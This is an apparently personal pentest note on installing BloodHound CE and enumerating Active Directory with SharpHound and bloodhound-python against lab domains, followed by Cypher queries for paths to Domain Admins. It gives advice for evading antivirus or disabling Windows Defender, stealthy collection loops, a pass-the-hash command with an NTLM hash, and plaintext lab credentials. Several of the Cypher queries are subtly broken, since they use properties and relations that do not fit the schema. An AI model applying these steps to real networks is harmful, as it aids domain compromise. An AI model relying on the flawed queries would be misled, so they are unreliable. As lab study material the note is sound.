Note title: Untitled

# BloodHound

> [!info] Definition **BloodHound** is an analysis tool used to identify and visualize relationships between objects in an **Active Directory** domain through detailed graphical representations.
> 
> It is the most widely used tool for Active Directory enumeration in Kali Linux.

> [!warning] Note 2025 In 2025, installing BloodHound via `apt` and `neo4j` separately causes errors when ingesting zip files, so it is recommended to follow the installation steps for the **Community Edition (CE)**, which automates the process of launching containers with Docker.

**Links:**

- [BloodHound-Legacy (GitHub)](https://github.com/SpecterOps/BloodHound-Legacy)
- [BloodHound CE Quickstart (SpecterOps)](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

---

## Installation

### 1. Install and Start Docker

bash

```bash
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker

# Añadir usuario al grupo docker
sudo usermod -aG docker $USER
sudo reboot
```

Note title: Untitled

> [!important] Once the user is added to the `docker` group, you must **reboot the system** for the changes to take effect. This step is **REQUIRED** to avoid subsequent errors.

### 2. Download BloodHound CE


```bash
mkdir Bloodhound && cd Bloodhound
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli
```

### 3. Help Menu



```bash
./bloodhound-cli -h
```



```text
BloodHound CLI is a command line interface for managing BloodHound and
associated containers and services. Commands are grouped by their use.

Usage:
  bloodhound-cli [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  config      Display or adjust the configuration
  containers  Manage BloodHound containers with subcommands
  help        Help about any command
  install     Builds containers and performs first-time setup of BloodHound
  logs        Fetch logs for BloodHound services
  resetpwd    Reset the admin password
  running     Print a list of running BloodHound services
  uninstall   Remove all BloodHound containers, images, and volume data
  update      Update the BloodHound container images if an update is available
  version     Displays BloodHound CLI's version information
```

### 4. Install BloodHound CE


```bash
./bloodhound-cli install
```



```text
[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it and continue with the install? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it and continue with the install? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
Pulling app-db     ...
Pulling graph-db   ...
Pulling bloodhound ...
Pulling app-db     ... pulling from library/postgres
Pulling bloodhound ... pulling from specterops/bloodhound
Pulling app-db     ... digest: sha256:cef2d22004db69e3d6...
Pulling app-db     ... status: image is up to date for p...
Pulling app-db     ... done
Pulling graph-db   ... pulling from library/neo4j
Pulling bloodhound ... digest: sha256:35cc75157164b495eb...
Pulling bloodhound ... status: image is up to date for s...
Pulling bloodhound ... done
Pulling graph-db   ... digest: sha256:2f9e1e52b4e2925970...
Pulling graph-db   ... status: image is up to date for n...
Pulling graph-db   ... done
Starting windows_graph-db_1 ...
windows_app-db_1 is up-to-date
Starting windows_graph-db_1 ... done
Creating windows_bloodhound_1 ...
Creating windows_bloodhound_1 ... done
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: VVfPBqpXFn9MNpsJyMYt9U4q*******
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Note title: Untitled

This creates a Docker container accessible at: `http://127.0.0.1:8080/ui/login`

---

## Potential errors

### Daemon not running

This error occurs because the user is not in the `docker` group or is running without `sudo`:



```bash
./bloodhound-cli install
```


```text
[+] Checking the status of Docker and the Compose plugin...
2025/04/25 19:07:01 Docker is installed on this system, but the daemon is not running
```

**Solution:** add the user to the Docker group and restart the machine:



```bash
sudo usermod -aG docker $USER
sudo reboot
```


```bash
./bloodhound-cli install
```


```text
[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Starting BloodHound environment installation
<---SNIP--->
```

Note title: Untitled

---

## Container Management

### View Active Docker Containers



```bash
docker ps
```



```text
CONTAINER ID   IMAGE                          COMMAND                  CREATED        STATUS                  PORTS                                                          NAMES
2e483ce2a900   specterops/bloodhound:latest   "/bloodhound -config…"   1 minute ago   Up 1 minute             127.0.0.1:8080->8080/tcp                                       windows_bloodhound_1
f13d5f34978d   neo4j:4.4                      "tini -g -- /startup…"   1 minute ago   Up 1 minute (healthy)   127.0.0.1:7474->7474/tcp, 7473/tcp, 127.0.0.1:7687->7687/tcp   windows_graph-db_1
4d169c98e5b1   postgres:16                    "docker-entrypoint.s…"   1 minute ago   Up 1 minute (healthy)   5432/tcp                                                       windows_app-db_1
```

Note title: Untitled

**3 containers** are automatically generated:

- `BloodHound`
- `Neo4j`
- `PostgreSQL`

### Container Commands



```bash
./bloodhound-cli containers
```



```text
Manage BloodHound containers and services with subcommands.

Usage:
  bloodhound-cli containers [command]

Available Commands:
  build       Builds the BloodHound containers (only needed for updates)
  down        Bring down all BloodHound services and remove the containers
  restart     Restart all stopped and running BloodHound services
  start       Start all stopped BloodHound services
  stop        Stop all BloodHound services without removing the containers
  up          Build, (re)create, and start all BloodHound containers

Flags:
  -h, --help   help for containers
```

Note title: Untitled

**Stop** all containers:



```bash
./bloodhound-cli containers down
```

**Restart** the containers:



```bash
./bloodhound-cli containers up
```

## Accessing the GUI

```
http://127.0.0.1:8080/ui/login
```

Note title: Untitled

Login with the default credentials provided when running `./bloodhound-cli install`:

|User|Password|
|---|---|
|`admin`|`VVfPBqpXFn9MNpsJyMYt9U4q*******`|

> [!tip] We should change the password upon first access.

---

## Download Collectors

We can download **SharpHound** directly from the GUI, or download the latest release from the repository (recommended):

- [SharpHound (GitHub)](https://github.com/SpecterOps/SharpHound)
- [SharpHound.ps1 (raw)](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)

> [!note] We need to send the `SharpHound.ps1` or `SharpHound.exe` file to the target Windows machine.
> 
> 1. Copy the raw from the repository and paste it into a text document (or send it from Kali to the target machine).
> 2. Save it as `SharpHound.ps1`.
> 
> This is to avoid antivirus detection when sending it from another machine. Another option would be to disable Windows Defender and send the file directly from Kali Linux.

### SharpHound.ps1



```powershell
PS C:\Users\hporter> Import-Module .\SharpHound.ps1
PS C:\Users\hporter> Invoke-BloodHound -CollectionMethod All
```



```text
2025-04-29T09:49:52.4871795-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-29T09:49:52.6903062-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:52.7528064-07:00|INFORMATION|Initializing SharpHound at 9:49 AM on 4/29/2025
2025-04-29T09:49:52.8465547-07:00|INFORMATION|Resolved current domain to spookysec.local
2025-04-29T09:49:53.0965549-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:53.2371798-07:00|INFORMATION|Beginning LDAP search for spookysec.local
<---SNIP--->
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Status: 310 objects finished (+310 155)/s -- Using 37 MB RAM
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Enumeration finished in 00:00:02.0415498
2025-04-29T09:49:55.7052367-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-04-29T09:49:55.7677396-07:00|INFORMATION|SharpHound Enumeration Completed at 9:49 AM on 4/29/2025! Happy Graphing!
```

### SharpHound.exe

SharpHound is the official data collector for BloodHound, written in C#. It gathers information about Active Directory environments to visualize privilege escalation paths.

**Basic Usage:**
```
SharpHound.exe --CollectionMethod All --Domain example.com --OutputDirectory C:\Temp
```

**Common Collection Methods:**
- `Default`: Basic AD objects (users, groups, GPOs)
- `All`: All available information
- `Group`: Group membership data
- `Session`: Logged-in user sessions
- `Computer`: Computer and permission data

**Key Features:**
- Can run as a normal domain user
- Outputs JSON files for BloodHound ingestion
- Supports stealth options to reduce detection
- Includes LDAP signing verification

**Stealth Considerations:**
```
SharpHound.exe --CollectionMethod Session --Loop --LoopDuration 00:30:00 --LoopInterval 00:05:00
```
This spreads collection over time to avoid spikes in LDAP queries.

**Output Files:**
- `*_Computers.json`
- `*_Groups.json`
- `*_Users.json`
- `*_GPOs.json`
- `*_OUS.json`



```powershell
PS C:\Users\hporter> .\SharpHound.exe -c All
```



```text
2025-04-29T09:49:52.4871795-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-29T09:49:52.6903062-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:52.7528064-07:00|INFORMATION|Initializing SharpHound at 9:49 AM on 4/29/2025
2025-04-29T09:49:52.8465547-07:00|INFORMATION|Resolved current domain to spookysec.local
2025-04-29T09:49:53.0965549-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:53.2371798-07:00|INFORMATION|Beginning LDAP search for spookysec.local
<---SNIP--->
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Status: 310 objects finished (+310 155)/s -- Using 37 MB RAM
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Enumeration finished in 00:00:02.0415498
2025-04-29T09:49:55.7052367-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-04-29T09:49:55.7677396-07:00|INFORMATION|SharpHound Enumeration Completed at 9:49 AM on 4/29/2025! Happy Graphing!
```

### Generated ZIP



```powershell
PS C:\Users\hporter> dir
```



```text
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of c:\Users\hporter>

04/24/2025  12:01 PM    <DIR>          .
04/24/2025  12:01 PM    <DIR>          ..
04/24/2025  12:01 PM           236,186 20250429094954_BloodHound.zip
```

Note title: Untitled

---

## Sending ZIP to Kali Linux

If we're connected via RDP with the local drive mounted, we can send it easily:



```bash
xfreerdp /v:10.10.10.10 /u:hporter /p:Gr8hambino! /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Check the location of the redirected drive:



```powershell
PS C:\Users\hporter> net use
```



```text
New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.
```

Copy the file to the local directory:



```powershell
PS C:\Users\hporter> copy .\20250424124339_data.zip \\Tsclient\Home
```

Note title: Untitled

> [!tip] You can also copy with `Ctrl+C` and paste into `Network \\tsclient\home` from the file explorer if connected via RDP.

Final path in Kali: `/home/kali/Escritorio/hack-tools/WINDOWS`

---

## Bloodhound-python

To avoid having to transfer SharpHound to the Windows machine and the generated zip back to Kali, we can use **bloodhound-python** directly from Kali Linux with valid AD user credentials.

First configure `/etc/resolv.conf` (where `spookysec.local` is the target domain):


```text
domain spookysec.local
nameserver 10.10.26.240
search spookysec.local
```

### With Credentials

Using the compromised user `backup`'s credentials:



```bash
bloodhound-python -d spookysec.local -u backup -p backup2517860 -dc AttacktiveDirectory.spookysec.local -c All --dns-tcp --zip
```



```text
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Done in 00M 12S
INFO: Compressing output into 20250326202635_bloodhound.zip
```

### With Hash (Pass the Hash)

We can use bloodhound-python with just the hash, without the plaintext password.

> [!warning] Add `:` before the hash or it won't work.



```bash
bloodhound-python -u 'Haze-IT-Backup$' --hashes ':84d6a733d85d9e03f46eba25b34517a9' -d haze.htb -ns 10.10.11.61 -c All --zip
```



```text
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20250508111541_bloodhound.zip
```

Note title: Untitled

---

## Import ZIP into BloodHound CE

In **Administration**, click on **Upload Files**.

---

## Exploring the Graphs

In the **Explore** section, we can start searching for users and groups in Active Directory.

### Inbound / Outbound Object Control

In BloodHound, the concepts of _Inbound Object Control_ and _Outbound Object Control_ refer to who controls whom at the object level in Active Directory. They are key to understanding control relationships between users, groups, computers, OUs, etc.

**🟢 Inbound Object Control**

> "Who can control this object?"

This value on a node (user or group) shows all objects that have control over it.

**🔵 Outbound Object Control**

> "Which objects does this node control?"

This value on a node shows all objects that the current node can control.

### Member Of

Shows the groups to which a specific user or group belongs.

### Local Admin Privileges

Shows the local admin privileges of different users and groups.

### Pathfinding

Allows viewing the path between various users, or between a user and a group.

### Node Type Filters

There are different types of filterable nodes in BloodHound. For example, to filter admin groups:



```text
group:admin
```

Note title: Untitled

---

## Cypher Queries

We can use different search queries in **Cypher** format to filter information from graphs. Just as SQL exists for MSSQL and other traditional relational databases, Cypher is a language designed for graph databases, with its own syntax.

### Basic Cypher

When creating Cypher queries, we generally try to build a path using the available relationships. Basic query:



```cypher
MATCH (B)-[A]->(R) RETURN B
```

- Starts with the keyword `MATCH`, which allows specifying a pattern in the database.
- Each variable (`B`, `A`, `R`) is defined with an identifier — it can be any word, like `groups`.
- **Nodes** are specified with parentheses `()` → `B` and `R` are nodes.
- **Relationships** are specified with square brackets `[]` → `A` represents a relationship.

### Interesting Search Queries

**✅ 1. Shortest Path to Domain Admins**



```cypher
MATCH p=shortestPath((n:User)-[*1..]->(m:Group))
WHERE toUpper(m.name) = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN p
```

**🔍 2. Full Control Paths to Domain Admins**



```cypher
MATCH p=shortestPath((u:User)-[r:MemberOf|AdminTo|AddMember|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AllExtendedRights|HasSession|CanRDP|ExecuteDCOM*1..]->(g:Group))
WHERE toUpper(g.name) = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN p
```

**🧠 3. Users with AdminTo Relationships on Machines with Domain Admin Sessions**



```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer)<-[:HasSession]-(da:User)
WHERE da.memberof = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, c.name, da.name
```

**🕵️ 4. Accounts That Can Compromise a DA Through ACLs (GPOs, WriteDACL, etc.)**



```cypher
MATCH (n:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(m:User)
WHERE toUpper(m.name) ENDS WITH "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN n.name, type(r), m.name
```

**🧰 5. Computers where DA has logged in (for token impersonation)**



```cypher
MATCH (u:User)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@INLANEFREIGHT.LOCAL"})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name
```

> [!note] This information can be used with **Rubeus**, **Mimikatz**, or token impersonation via `Invoke-TokenManipulation`.

**🔐 6. Users with AddMember rights on sensitive groups**



```cypher
MATCH (u:User)-[:AddMember]->(g:Group)
WHERE g.name = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, g.name
```

This indicates that `u` can be added to Domain Admins directly if it has write privileges.

**🚨 7. Users who can perform Kerberoasting and are not Domain Admins**



```cypher
MATCH (u:User)-[:HasSID]->(s:Kerberos)
WHERE u.hasspn = true AND NOT u.name ENDS WITH "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, u.serviceprincipalnames
```

**💣 8. Users with delegation permissions (constrained and unconstrained)**



```cypher
MATCH (u:User)
WHERE u.allowedtodelegate IS NOT NULL OR u.unconstraineddelegation = true
RETURN u.name, u.allowedtodelegate, u.unconstraineddelegation
```

### 🔁 Reuse as Cypher Function in BloodHound CE

> [!tip] You can save these queries in BloodHound CE as custom _queries_ from the GUI, in the **Custom Queries** section. Name and describe them for repeated use in operations.